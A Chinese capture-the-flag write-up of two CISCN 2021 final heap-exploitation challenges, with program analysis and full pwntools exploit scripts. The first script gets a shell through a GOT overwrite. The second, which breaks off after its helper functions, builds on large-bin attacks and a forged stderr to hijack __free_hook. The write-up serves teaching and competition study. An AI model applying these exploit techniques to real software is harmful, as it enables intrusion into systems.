# ciscn2021决赛pwn题解
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## allocate
###  程序分析
自己实现了一个分配器, 空闲的chunk组成一个单链表
  * chunk结构
  * 释放
  * 申请 
    * 先尝试从free_list中获取如果失败了就直接切割mmap_mem
###  思路
  * 关键在与怎么覆盖next指针, 虽然Alloc有明显的整数溢出, 但是没法利用
  * 结果发现是一个关于read的骚操作: 如果read的写入区域内有不可写入的地址, 那么不会SIGV, 而是返回-1
  * 这种经典读写写法中没有判断read为-1的情况, 因此如果有不可写入的区域, read就会一直返回-1, 然后idx+= -1, 不停的向前, 直到可以全部写入read的内容位置
  * 而在Alloc时, 只检查了剩下来的是否为负数, 剩下的够不够分, 因此是很容易分割出一片不可写内存的
  * 分割出不可写内存时也要注意, 如果v2->size这样用户态的写入, 如果v2不可写会直接SIGV, 因此还要保证v2->size可写
  * 综上, 直接把chunk切割到只剩下0x10作为chunk头, 然后申请一大片内存, 利用read的返回-1就可以覆盖next
  * 劫持next之后, 从中分配出来时会检查size是否合适
  * 因此不能直接劫持到GOT上, 因为上面都是libc地址
  * 由于bss上有PtrArr, 因此分配到PtrArr前面, 覆盖PtrArr再通过这个进行任意写, size我直接选择bss地址了
exp
    #! /usr/bin/python2
    # coding=utf-8
    import sys
    from pwn import *
    from random import randint
    context.log_level = 'debug'
    context(arch='amd64', os='linux')
    elf_path = "./pwn"
    elf = ELF(elf_path)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    def Log(name):    
        log.success(name+' = '+hex(eval(name)))
    if(len(sys.argv)==1):            #local
        cmd = ['/home/chenhaohao/pwn']
        sh = process(cmd)
        proc_base = sh.libs()['/home/chenhaohao/pwn']
    else:                        #remtoe
        sh = remote('39.105.134.183', 18866)
    def GDB():
        gdb.attach(sh, '''
        break *(0x401A21)
        break *0x401a6d 
        ''')
    def Bits2Str(cont):
        res = ''
        for i in range(0, len(cont), 8):
            res+=chr(int(cont[i: i+8][::-1], 2))
        return res[::-1]
    def Num(n):
        sh.sendline(str(n))
    def Cmd(c):
        sh.recvuntil('>> ')
        sh.sendline(c)
    def Gain(idx, sz, cont):
        Cmd('gain(%d);'%(idx))
        sh.recvuntil(': ')
        Num(sz)
        sh.recvuntil(': ')
        sh.send(cont)
    def Edit(idx, cont):
        Cmd('edit(%d);'%(idx))
        sh.recvuntil(': ')
        sh.send(cont)
    def Show(idx):
        Cmd('show(%d);'%(idx))
    def Free(idx):
        Cmd('free(%d);'%(idx))
    #exhaust mmap_mem
    Gain(0, 0xFC0, 'A\n')
    Gain(1, 0x10, 'B'*0x10)
    Free(1)
    #reverse overflow
    exp = p64(0x20)
    exp+= p64(0x4043b0)         #free_list = &free_list
    exp = exp.ljust(0x30-1, 'B')
    exp+= '\n'
    Gain(2, 0x110, exp)     #free_list->chunk1->atoi@GOT
    #control PtrArr
    Gain(3, 0x10, 'B'*0x10)
    exp = p64(0x4040b8)     #aoti@GOT
    exp+= '\n'
    Gain(4, 0x4043b0-0x10, exp) #size = &free_list-0x10
    #leak addr
    Show(0)
    libc.address = u64(sh.recv(6).ljust(8, '\x00'))-libc.symbols['atoi']
    Log('libc.address')
    #control GOT
    Edit(0, p64(libc.symbols['system'])+'\n')
    #getshell
    Cmd('aaaa(/bin/sh);')
    sh.interactive()
    '''
    mem stat: telescope 0x4043A0
    '''
###  总结
  * read读入含有不可写区域时会返回-1
  * no PIE出了直接打GOT, 还要考虑bss上的指针数组
## Binary_Cheater
  * 2.32的libc
  * 禁用了execve
###  程序分析
  * 虽然后执行流混淆, 但是程序本身比较简单, 影响不大, 可以直接看
  * 每次循环都会 
    * 检查 **malloc_hook与** free_hook是否为0
    * 清空tcache chunk
  * Create 
    * 最多16个
    * 0x410top指针, 再次分配时就会因为chunk大小不足, 进入sysmalloc(), 其中有一个关于page对齐的检查, 很容易触发fail
  * 在覆盖tcache与stderr时有一个很精妙的地方 
    * 覆盖两个地址, 正常的思路是两套size, 5个chunk,比如0x430, 0x420一次, 然后0x440 0x450一次, 由于这题size范围很窄, 因此不可行
    * 进一步的是一种复用的思路, 使用3个chunk, 再来一个chunkC 0x420, chunkA配合chunkB先来一次, 然后取出chunkB, chunkA再配合chunkC来一次 
      * 第一次放入chunkB时会有*(addr1+0x20)=chunkB
      * 取出时由于unlink, 会有*(addr1+0x20) = chunkA
      * 第二次放入chunkC时会有*(addr2+0x20)=chunkC
      * 因此addr1 addr2实际对应chunkA chunkC, 而不是chunkB chunkC
    * 再进一步, 其实用两个chunk就可以了, 先chunkA配合chunkB来一次, 取出后, 有 _addr1=chunkA, 然后chunkA配合chunk再来一次, 不取出来, 就有_ addr2 = chunkB
    * 本题一共需要3次LargeBin Attack, 0x420配合0x420进行两次, 0x440配合0x450进行一次, 0x460用来触发UB sort, 刚好
  * 接着考虑伪造stderr, printf(stderr)会调用_IO_xsputn_t, 要让其偏移到_IO_str_jumps中的_IO_str_overflow
  * _IO_str_overflow会把原来[_IO_buf_base, _IO_buf_end)复制到malloc得到的内存中, 因此伪造tcache指向__free_hook-0x10, 利用memcpy覆盖hook为rdx_GG, 布置好SigreturnFrame就可以开启ROP
EXP
    #! /usr/bin/python2
    # coding=utf-8
    import sys
    from pwn import *
    from random import randint
    context.log_level = 'debug'
    context(arch='amd64', os='linux')
    elf_path = "./pwn"
    elf = ELF(elf_path)
    libc = ELF('./libc.so.6')
    def Log(name):    
        log.success(name+' = '+hex(eval(name)))
    if(len(sys.argv)==1):            #local
        cmd = ['/home/chenhaohao/pwn']
        sh = process(cmd)
        proc_base = sh.libs()['/home/chenhaohao/pwn']
    else:                        #remtoe
        sh = remote('39.105.134.183', 18866)
    def GDB():
        gdb.attach(sh, '''
        telescope 0x50F0+0x0000555555554000 16
        heap bins
        break *0x7ffff7e73c11
        ''')
    def Num(n):
        sh.sendline(str(n))
    def Cmd(n):
        sh.recvuntil('>> ')
        Num(n)
    def Create(sz, cont=''):
        Cmd(1)
        sh.recvuntil('(: Size: ')
        Num(sz)
        if(cont==''):
            cont='A'*sz
        sh.recvuntil('(: Content: ')
        sh.send(cont)
    def Edit(idx, cont):
        Cmd(2)
        sh.recvuntil('Index: ')
        Num(idx)
        sh.recvuntil('Content: ')
        sh.send(cont)
    def Delete(idx):
        Cmd(3)
        sh.recvuntil('Index: ')
        Num(idx)